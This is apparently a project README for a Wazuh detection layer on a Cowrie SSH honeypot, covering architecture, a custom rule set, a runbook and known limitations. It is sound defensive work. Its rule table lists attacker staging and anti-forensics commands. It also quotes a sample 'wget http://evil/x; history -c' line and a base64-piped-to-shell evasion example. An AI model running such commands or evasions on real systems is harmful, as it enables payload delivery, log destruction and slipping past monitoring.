# Wazuh detection layer for the Cowrie honeypot

A SOC detection pipeline built on top of an existing internet-facing Cowrie SSH honeypot:
sensor → agent → SIEM → tuned rules → triaged alerts.

The [attack dashboard](../README.md) in this repo already visualizes what the honeypot sees.
That is **passive telemetry** — it shows what happened. It has no concept of severity, no
correlation, and nothing that fires when something matters. This layer adds the detection half:
a Wazuh manager on a separate VM, a custom rule set that classifies honeypot activity along the
attacker's actual kill chain, and correlation that turns a stream of failed logins into a single
brute-force alert.

---

## Architecture

```
        internet (hostile)
               │
               ▼
┌──────────────────────────────┐            ┌──────────────────────────────┐
│  fishhoney  (existing VM)    │            │  wazuh-mgr  (new VM)         │
│  ── assumed compromised ──   │            │  ── trusted ──               │
│                              │            │                              │
│  Cowrie (SSH/Telnet emu)     │            │  ┌────────────────────────┐  │
│    └── cowrie.json           │            │  │ wazuh.manager  Docker  │  │
│          │                   │            │  │ wazuh.indexer          │  │
│          ├──► wazuh-agent ───┼── 1514/tcp ┼─►│ wazuh.dashboard :443   │  │
│          │    (apt, pinned)  │  private ip│  └────────────────────────┘  │
│          │                   │            │        ▲                     │
│          └──► cowrie-dashboard :8080      │        │ NSG: my /32 only    │
│               (SSH tunnel only)           │        │                     │
└──────────────────────────────┘            └──────────────────────────────┘
```

### Why the SIEM is not on the honeypot

This is the single most important decision in the build, and the first thing to be able to
defend.

Cowrie is *deliberately* exposed to the internet and is designed to be broken into. Every
assumption you make about that box is provisional. Putting the SIEM on it would mean the system
responsible for detecting a compromise shares a kernel, a filesystem, and a blast radius with
the thing most likely to be compromised — an attacker who escapes the honeypot's containment
lands directly on top of the evidence and the detection logic, and can tamper with both.

Separating them means the honeypot's job is to *observe and forward*, and nothing else. The
manager holds the alerts, the rules, and the history, on a host with no inbound path from the
internet at all.

Two consequences worth noticing, both good:

- The agent **initiates** its connection outbound, so the honeypot needs **no new inbound
  firewall rules**. Adding a detection capability did not widen its attack surface by a single
  port.
- The Wazuh API (55000) is only consumed by the dashboard container over Docker's internal
  bridge, so it gets no NSG rule either. The only externally reachable service on the manager is
  the dashboard, restricted to one `/32`.

---

## Why there is no custom decoder

The obvious approach — and the one most Cowrie/Wazuh tutorials take — is to write a custom
decoder that prematches on `cowrie.` and routes to the JSON decoder. Doing that here would have
been redundant and slightly harmful.

Cowrie writes flat JSON, and the agent ships it with `<log_format>json</log_format>`. Wazuh's
built-in JSON decoder already extracts every key — `eventid`, `src_ip`, `username`, `password`,
`session`, `input`, `url` — as a queryable dynamic field. Wazuh's own
[documentation](https://documentation.wazuh.com/current/user-manual/ruleset/decoders/json-decoder.html)
says the JSON decoder eliminates the need for a source-specific decoder.

A custom decoder that matched `cowrie.` first would **take precedence over** the JSON decoder
and produce *worse* field extraction than writing nothing at all. The rules key off
`<decoded_as>json</decoded_as>` plus `<field name="...">` instead.

Knowing which component already solves a problem is the actual skill here. The decoder that
does not exist is a deliberate artifact of the design.

---

## The rule set

[`manager/rules/local_rules.xml`](manager/rules/local_rules.xml) — IDs `100200`–`100299`
(Wazuh reserves everything below 100000).

The rules are a **tree**, not a flat list: a level-0 base rule matches all Cowrie events, and
everything else chains off it with `<if_sid>`, escalating along the attacker's real progression
from knocking on the door to running code to dropping a payload.

| SID | Level | Fires on | MITRE |
|-----|-------|----------|-------|
| `100200` | **0** | any `eventid` matching `^cowrie\.` — base rule, alerts on nothing | — |
| `100201` | 3 | `cowrie.session.connect` | — |
| `100202` | 3 | `cowrie.login.failed` | T1110 |
| `100203` | **10** | `cowrie.login.success` | T1078 |
| `100204` | 8 | `cowrie.command.input` (any command) | T1059.004 |
| `100205` | 12 | `cowrie.session.file_download` | T1105 |
| `100206` | 12 | `cowrie.session.file_upload` | T1105 |
| `100210` | 10 | >8 × `100202` from the **same** `src_ip` within 120s → brute force | T1110.001 |
| `100211` | 12 | command matches recon (`uname`, `whoami`, `cat /etc/passwd`, `/proc/cpuinfo`, `lscpu`, `nproc`, `free -m`) | T1082, T1087 |
| `100212` | 12 | command matches payload staging (`wget`, `curl`, `tftp`, `ftpget`, `busybox wget`) | T1105 |
| `100213` | **13** | command matches anti-forensics / persistence (`history -c`, `chmod +x /tmp/`, `crontab`, `authorized_keys`, `rm -rf /var/log`) | T1070.003, T1053 |

### The four decisions an interviewer will poke at

**1. The base rule is level 0 on purpose.**
This honeypot generates thousands of `session.connect` and `login.failed` events a day. A base
rule that alerted on every one of them would produce a wall of noise that guarantees nobody
reads the alerts — the classic way a detection deployment dies. Level 0 means *match but do not
alert*: the rule still parents the entire tree via `<if_sid>`, it just contributes nothing to
the alert stream. It also doubles as the pipeline health check — if `wazuh-logtest` resolves a
Cowrie line to `100200`, ingestion and decoding are working even when nothing is alerting.

Events Cowrie emits that no rule classifies (`cowrie.client.version`, `cowrie.session.closed`,
key exchange chatter) land on `100200` and stay silent. They are still decoded and still
queryable — they just don't page anyone.

**2. Login severity is inverted relative to a production host.**
On a real server, a failed login is routine and a *success* is expected. On a honeypot it is
exactly backwards: nobody has a legitimate reason to authenticate at all, so a successful login
means an attacker just cleared the front door and the next events will be commands. Hence
`login.failed` at 3 and `login.success` at 10. Copying a production severity model onto a
honeypot would have buried the most important event in the log.

**3. Correlation uses `<same_field>src_ip</same_field>`, not `<same_srcip/>`.**
This one fails *silently* if you get it wrong, which is what makes it worth calling out. Wazuh's
built-in `<same_srcip/>` correlates on its own `srcip` field — which Cowrie never populates,
because the JSON decoder produces a dynamic field literally named `src_ip`. Using the wrong one
doesn't throw an error; the rule still fires, but it merges failed logins from *completely
unrelated attackers* into one "brute force" alert, and every count you report afterwards is
wrong.

`verify_rules.sh` tests this with a **negative** case specifically: ten failures spread across
ten different IPs must **not** escalate. A test that only checks the positive path would pass
against the broken version.

**4. Command rules are ordered most-severe-first.**
Wazuh evaluates sibling rules in file order and stops at the first match. `wget http://evil/x;
history -c` trips both `100212` (staging) and `100213` (anti-forensics) — listing `100213`
first is what makes it alert at 13 instead of 12. `scripts/test_rule_logic.py` asserts this
ordering invariant so a future edit can't quietly reverse it.

Field patterns use `type="pcre2"` rather than Wazuh's default OS_Regex, which is a simplified
dialect with different metacharacter semantics — PCRE2 gives reliable anchoring, alternation,
and `(?i)`.

---

## Runbook

Order matters. Each step has a gate; don't move on until it's green.

### 1 — Network and manager VM

Follow [`docs/azure-nsg.md`](docs/azure-nsg.md): discover the Cowrie VM's VNet and private IP,
create the manager VM **in the same VNet**, apply four source-restricted NSG rules.

> **Gate:** `nc -zv <mgr-private-ip> 1514` connects from the Cowrie VM; `https://<mgr-public-ip>`
> loads from your workstation and times out from anywhere else.

### 2 — Bring up the Wazuh stack (on the manager VM)

```bash
git clone https://github.com/fishys96/cowrie-dashboard.git
cd cowrie-dashboard
sudo ./wazuh/scripts/setup-manager.sh
```

Installs Docker if missing, persists `vm.max_map_count=262144`, clones `wazuh-docker` pinned to
`v4.14.7`, generates certificates, bind-mounts the rule file, enables JSON archives, and brings
the stack up. Idempotent — re-running it is also how you deploy a rule change.

> **Gate:** `docker compose ps` shows manager, indexer, and dashboard healthy.
> **Then immediately change the default `admin` / `SecretPassword` credentials.**

### 3 — Install the agent (on the Cowrie VM)

```bash
cd ~/cowrie-dashboard && git pull
sudo WAZUH_MANAGER=<mgr-private-ip> ./wazuh/agent/install-agent.sh
```

Verifies the Cowrie log is present and parseable *before* configuring anything, installs the
agent pinned to 4.14 and `apt-mark hold`s it, enrolls against the manager, and appends the
`<localfile>` block.

> **Gate:** the agent shows **Active** in the dashboard under *Agents*. Nothing below is
> meaningful until it does.

### 4 — Confirm ingestion before worrying about alerts

Wazuh only writes to `alerts.json` once a rule matches, so an empty dashboard at this point is
ambiguous. `setup-manager.sh` enabled `<logall_json>`, which records everything received:

```bash
docker compose exec wazuh.manager \
  grep -m5 cowrie /var/ossec/logs/archives/archives.json
```

> **Gate:** raw Cowrie events appear with populated `data.eventid`, `data.src_ip`,
> `data.username` — *decoded fields*, not an opaque blob. "No alerts yet" here is expected and
> fine.

### 5 — Validate the rules

**Offline, on a laptop, no Wazuh required:**
```bash
python3 wazuh/scripts/test_rule_logic.py
```

**Authoritative, on the manager:**
```bash
sudo ./wazuh/scripts/verify_rules.sh
```
Compiles the ruleset with `wazuh-analysisd -t`, then feeds every fixture through
`wazuh-logtest` and asserts the expected SID and level — including the brute-force positive and
the same-source negative.

**End to end, on the Cowrie VM**, replaying real attacker traffic already on disk:
```bash
sudo python3 wazuh/scripts/replay_to_agent.py --install-localfile
sudo python3 wazuh/scripts/replay_to_agent.py --count 40
# confirm alerts land in the dashboard, then:
sudo python3 wazuh/scripts/replay_to_agent.py --cleanup
```
Replayed events go to a **dedicated** log, never into `cowrie.json` — that file is evidence, and
it's also what the live dashboard tails.

> **Gate:** alerts appear in *Threat Hunting* (filter `rule.groups:cowrie`) at the expected
> levels, with readable descriptions.

### 6 — Live

> **Gate:** within 24h of real traffic, `100210` (brute force), `100203` (login success), and
> `100204` (command execution) have all fired against genuine attackers.

Then turn `<logall_json>` back off (see
[`manager/wazuh_manager.conf.snippet`](manager/wazuh_manager.conf.snippet)) unless you're about
to start the retroactive-reporting project — archives grow fast on a honeypot.

---

## Rules as code

The stock `wazuh-docker` stack keeps `/var/ossec/etc` in a **named volume**, so rules edited
through the dashboard's rule editor live only inside Docker: not in git, not reviewable, not
diffable, and gone the moment the volume is recreated.

`manager/docker-compose.override.yml` bind-mounts the rule file **read-only** instead. Detection
content is versioned alongside the code it protects, changes go through a diff, and deployment
is a container restart.

The trade-off is real and intentional: the dashboard's built-in rule editor can no longer save
to this file. Detection logic changes through git, not through a web form with no history.

---

## What this catches — and what it misses

The honest section. A detection layer you can't describe the limits of isn't one you should
trust.

**Catches well**
- Automated credential stuffing — the dominant traffic on this sensor, and exactly what
  `100210` is tuned for.
- The full post-compromise sequence: successful login → recon → payload staging → file drop,
  each at escalating severity.
- Attacker infrastructure: source IPs, credential lists, and payload URLs, all queryable as
  decoded fields rather than free text.

**Misses, by construction**
- **Slow and distributed brute force.** `100210` needs >8 failures from one IP in 120 seconds. An
  attacker at one attempt per minute, or spread across a botnet, never trips it. Catching that
  needs behavioural aggregation over a long window, which rule-based correlation isn't the right
  tool for.
- **Obfuscated commands.** `100211`–`100213` are regex over the literal command string.
  `echo d2dldA== | base64 -d | sh`, variable indirection, or unusual whitespace all evade them.
  They classify *lazy* attackers accurately, which is most of them, but they are pattern
  matching and not semantic analysis.
- **Anything Cowrie doesn't emulate.** The sensor only reports interactions with the fake shell
  it presents. Exploits against services it doesn't implement, or protocol-level attacks below
  the SSH layer, are invisible — this is a limitation of the *sensor*, not the SIEM, and no rule
  can recover data that was never logged.
- **Everything off-host.** No network flow data, no packet capture, no detonation of the
  downloaded samples. `100205` tells you a payload arrived and gives you its SHA-256; it says
  nothing about what the payload does.
- **Availability and integrity.** Single-node: no HA, and if the manager VM is lost the alert
  history goes with it. Fine for a lab, not for anything that has to survive an incident. There
  is also no log-integrity guarantee — nothing here proves the honeypot's log wasn't tampered
  with before the agent read it.
- **Detection only.** No active response, no blocking, no ticketing. The honeypot is *supposed*
  to be attacked; auto-blocking would defeat the point of running it.

---

## Layout

```
wazuh/
  README.md                          this document
  manager/
    docker-compose.override.yml      bind-mounts rules read-only, pins indexer heap
    wazuh_manager.conf.snippet       JSON archives, and why they matter
    rules/local_rules.xml            the rule set
  agent/
    install-agent.sh                 idempotent install + enroll + configure
    cowrie-localfile.xml             the <localfile> block, annotated
  scripts/
    setup-manager.sh                 stand up the Docker stack (manager VM)
    verify_rules.sh                  authoritative rule assertions via wazuh-logtest
    test_rule_logic.py               offline regex + ordering smoke test (runs anywhere)
    replay_to_agent.py               end-to-end replay of real historical events
    fixtures/cowrie_fixtures.jsonl   one representative event per rule
  docs/
    azure-nsg.md                     VM provisioning + source-restricted NSG rules
```

## Versions

Pinned deliberately, never `latest` — agent/manager version drift is a classic cause of silent
ingestion failure.

| Component | Version |
|---|---|
| Wazuh manager (`wazuh-docker`) | `v4.14.7` |
| Wazuh agent | `4.14.7-1`, held via `apt-mark hold` |

## Next

Deliberately out of scope here, unblocked by this layer:

- **Retroactive analysis** of the pre-Wazuh Cowrie history against these rules. Note the
  constraint documented in `replay_to_agent.py`: Wazuh stamps alerts with *reception* time, so
  replaying old logs cannot reconstruct a historical alert timeline — that project needs to work
  from `archives.json` or from the raw logs directly.
- **AI-generated incident reports** built from the alert stream, once these rules have produced
  a body of real alerts worth summarizing.
